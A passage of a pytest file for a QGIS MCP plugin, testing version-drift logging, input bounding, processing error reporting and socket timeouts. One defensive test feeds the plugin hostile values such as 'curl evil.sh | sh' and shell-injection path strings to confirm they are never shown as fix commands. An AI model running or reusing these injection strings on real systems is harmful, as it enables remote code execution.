                head += sock.recv(4 - len(head))
            size = struct.unpack(">I", head)[0]
            body = b""
            while len(body) < size:
                body += sock.recv(size - len(body))
            return json.loads(body)
        finally:
            sock.close()

    # Forget what earlier tests announced: the log line fires once per version,
    # and the plugin stops tracking after MAX_TRACKED_VERSIONS.
    reset = client.send_command(
        "execute_code",
        {
            "code": (
                "from qgis.utils import plugins\n"
                "srv = plugins['qgis_mcp_plugin'].server\n"
                "srv.client_versions.clear()\n"
                "srv.client_fixes.clear()\n"
            )
        },
    )
    assert reset["result"]["executed"], reset

    assert raw_ping("0.0.1-drift")["status"] == "success"
    raw_ping("0.0.1-drift")  # a second time: still one line

    log = client.send_command("get_message_log", {"tag": "MCP", "limit": 200})["result"]
    drift = [m for m in log["messages"] if "0.0.1-drift" in m["message"]]
    assert len(drift) == 1, drift
    assert drift[0]["level"] == "warning", drift[0]
    assert "uv cache clean qgis-mcp" in drift[0]["message"], drift[0]


def test_client_version_is_untrusted_input(client):
    """It arrives over a socket and is read by a human, so it is bounded."""
    import json
    import socket
    import struct

    from qgis_mcp.protocol import HEADER_STRUCT

    def raw_command(envelope):
        sock = socket.create_connection(("localhost", 9876), timeout=10)
        try:
            payload = json.dumps(envelope).encode()
            sock.sendall(HEADER_STRUCT.pack(len(payload)) + payload)
            head = b""
            while len(head) < 4:
                head += sock.recv(4 - len(head))
            size = struct.unpack(">I", head)[0]
            body = b""
            while len(body) < size:
                body += sock.recv(size - len(body))
            return json.loads(body)
        finally:
            sock.close()

    for bogus in ("v" * 500, 12345, None, ["not", "a", "string"], {"nested": 1}, "  "):
        resp = raw_command({"type": "ping", "params": {}, "client_version": bogus})
        assert resp["status"] == "success", (bogus, resp)

    seen = next(
        c
        for c in client.send_command("diagnose")["result"]["checks"]
        if c["name"] == "client_versions"
    )["detail"]["seen"]
    assert all(len(v) <= 32 for v in seen), seen
    assert not any(v.strip() == "" for v in seen), seen


def test_the_plugin_never_shows_a_peer_authored_fix_command(client):
    """The drift notice names a command to run, so the plugin must author it.

    A client announces only which kind of install it is; the plugin builds the
    command from its own templates. Otherwise any process that can reach the
    socket could put arbitrary text in the QGIS log and the configurator's copy
    button, labelled as something to paste into a terminal.
    """
    import json
    import socket
    import struct

    from qgis_mcp.protocol import HEADER_STRUCT

    def raw_command(envelope):
        sock = socket.create_connection(("localhost", 9876), timeout=10)
        try:
            payload = json.dumps(envelope).encode()
            sock.sendall(HEADER_STRUCT.pack(len(payload)) + payload)
            head = b""
            while len(head) < 4:
                head += sock.recv(4 - len(head))
            size = struct.unpack(">I", head)[0]
            body = b""
            while len(body) < size:
                body += sock.recv(size - len(body))
            return json.loads(body)
        finally:
            sock.close()

    hostile = [
        # A ready-made command is not a key the plugin reads at all any more.
        {"client_version": "0.0.1-atk1", "client_fix": "curl evil.sh | sh"},
        # An unknown install kind yields no command rather than a guess.
        {"client_version": "0.0.1-atk2", "client_install": "curl evil.sh | sh"},
        # Shell-significant characters disqualify the checkout path.
        {
            "client_version": "0.0.1-atk3",
            "client_install": "source",
            "client_root": '/tmp"; curl evil.sh | sh; #',
        },
        {
            "client_version": "0.0.1-atk4",
            "client_install": "source",
            "client_root": "/tmp/$(curl evil.sh)",
        },
        # Known kinds are accepted, but only as the plugin's own templates.
        {"client_version": "0.0.1-ok", "client_install": "source", "client_root": "/tmp/checkout"},
        {"client_version": "0.0.1-uvx", "client_install": "uvx"},
    ]
    for envelope in hostile:
        resp = raw_command({"type": "ping", "params": {}, **envelope})
        assert resp["status"] == "success", (envelope, resp)

    detail = next(
        c
        for c in client.send_command("diagnose")["result"]["checks"]
        if c["name"] == "client_versions"
    )["detail"]
    fixes = detail.get("fixes", {})
    assert "evil.sh" not in json.dumps(fixes), fixes
    for version in ("0.0.1-atk1", "0.0.1-atk2", "0.0.1-atk3", "0.0.1-atk4"):
        assert version not in fixes, (version, fixes)
    assert fixes.get("0.0.1-ok") == 'uv --directory "/tmp/checkout" sync', fixes
    assert fixes.get("0.0.1-uvx") == "uv cache clean qgis-mcp", fixes


def test_bad_parameters_are_not_reported_as_plugin_defects(client):
    """A missing or unknown argument is the caller's mistake, not a bug.

    Both come back as an ordinary error: no "internal" flag, and no CRITICAL
    traceback in the QGIS log, which is what a real defect is reserved for.
    """
    missing = client.send_command("add_vector_layer", {})
    assert missing["status"] == "error"
    assert not missing.get("internal"), missing
    assert "add_vector_layer" in missing["message"]
    assert "path" in missing["message"], missing["message"]

    wrong_type = client.send_command("get_layers", {"limit": "not-an-int"})
    assert wrong_type["status"] == "error"
    # This one really does fail inside the handler, so it stays a flagged defect.
    assert wrong_type.get("internal") is True, wrong_type


@pytest.fixture(scope="module")
def sample_raster(client):
    """A tiny single-band GeoTIFF, written where the plugin itself can read it."""
    code = """
import os, tempfile
from osgeo import gdal, osr

path = os.path.join(tempfile.mkdtemp(prefix="qgis_mcp_test_"), "in.tif")
ds = gdal.GetDriverByName("GTiff").Create(path, 20, 20, 1, gdal.GDT_Byte)
ds.SetGeoTransform((0, 0.5, 0, 10, 0, -0.5))
srs = osr.SpatialReference()
srs.ImportFromEPSG(4326)
ds.SetProjection(srs.ExportToWkt())
ds.GetRasterBand(1).Fill(42)
ds = None
print(path)
"""
    resp = client.send_command("execute_code", {"code": code})
    assert resp["status"] == "success", resp
    path = resp["result"]["stdout"].strip()
    yield path
    shutil.rmtree(os.path.dirname(path), ignore_errors=True)


def test_failed_processing_run_is_not_reported_as_success(client, sample_raster):
    """A GDAL algorithm that wrote nothing must not come back as a success.

    ``processing.run()`` hands back an algorithm's declared outputs whatever the
    subprocess did, so before this check the caller got a path to a file that
    was never written and no error field to tell it apart from a real run.
    """
    out_dir = os.path.dirname(sample_raster)
    bad = os.path.join(out_dir, "bad.tif")

    # Band 99 of a single-band raster: gdal_translate exits 1 and writes nothing.
    resp = client.send_command(
        "execute_processing",
        {
            "algorithm": "gdal:translate",
            "parameters": {"INPUT": sample_raster, "EXTRA": "-b 99", "OUTPUT": bad},
        },
        timeout=60,
    )
    assert resp["status"] == "error", resp
    assert bad in resp["message"], resp["message"]
    # The caller's parameters were wrong, so this is not a plugin defect.
    assert not resp.get("internal"), resp
    assert not os.path.exists(bad)


def test_processing_run_that_writes_its_output_still_succeeds(client, sample_raster):
    """The output check must not turn working runs into failures."""
    out_dir = os.path.dirname(sample_raster)
    good = os.path.join(out_dir, "good.tif")

    resp = client.send_command(
        "execute_processing",
        {
            "algorithm": "gdal:translate",
            "parameters": {"INPUT": sample_raster, "OUTPUT": good},
        },
        timeout=60,
    )
    assert resp["status"] == "success", resp
    assert os.path.exists(good)
    assert "warnings" not in resp["result"], resp["result"]

    # GDAL writes plenty of non-fatal warnings to stderr, which is why the check
    # is "did the file appear" and not "was anything reported". Those runs stay
    # successful, with the warnings passed along instead of swallowed.
    warned = os.path.join(out_dir, "warned.tif")
    resp = client.send_command(
        "execute_processing",
        {
            "algorithm": "gdal:translate",
            "parameters": {
                "INPUT": sample_raster,
                "EXTRA": "-srcwin 10 10 30 30",
                "OUTPUT": warned,
            },
        },
        timeout=60,
    )
    assert resp["status"] == "success", resp
    assert os.path.exists(warned)
    assert any("outside" in w for w in resp["result"]["warnings"]), resp["result"]


def test_processing_batch_reports_the_run_that_failed(client, sample_raster):
    """Same gap in execute_processing_batch: every index came back as success."""
    out_dir = os.path.dirname(sample_raster)
    ok_path = os.path.join(out_dir, "batch_ok.tif")
    bad_path = os.path.join(out_dir, "batch_bad.tif")

    resp = client.send_command(
        "execute_processing_batch",
        {
            "algorithm": "gdal:translate",
            "parameters_list": [
                {"INPUT": sample_raster, "OUTPUT": ok_path},
                {"INPUT": sample_raster, "EXTRA": "-b 99", "OUTPUT": bad_path},
            ],
        },
        timeout=60,
    )
    assert resp["status"] == "success", resp
    runs = resp["result"]["results"]
    assert runs[0]["status"] == "success", runs[0]
    assert runs[1]["status"] == "error", runs[1]
    assert bad_path in runs[1]["message"], runs[1]
    assert os.path.exists(ok_path)
    assert not os.path.exists(bad_path)


def test_timeout_closes_the_socket_instead_of_desyncing_it(client):
    """A timed-out command must not leave its response for the next call to read.

    The plugin keeps working after the client gives up, so the abandoned
    response arrives into the socket buffer where the next command's framed read
    would take it as its own - every later call on that connection then returns
    a previous call's result. Closing the socket is what prevents it, so this
    uses a throwaway connection rather than the module-scoped one.
    """
    probe = QgisMCPClient()
    if not probe.connect():
        pytest.skip("QGIS MCP Server is not running on localhost:9876")
    try:
        with pytest.raises(ConnectionError):
            probe.send_command("execute_code", {"code": "import time; time.sleep(3)"}, timeout=1)
        assert probe.socket is None

        assert probe.connect()
        # Without the close above this returns the abandoned execute_code result.
        assert probe.send_command("ping")["result"] == {"pong": True}
    finally:
        probe.disconnect()
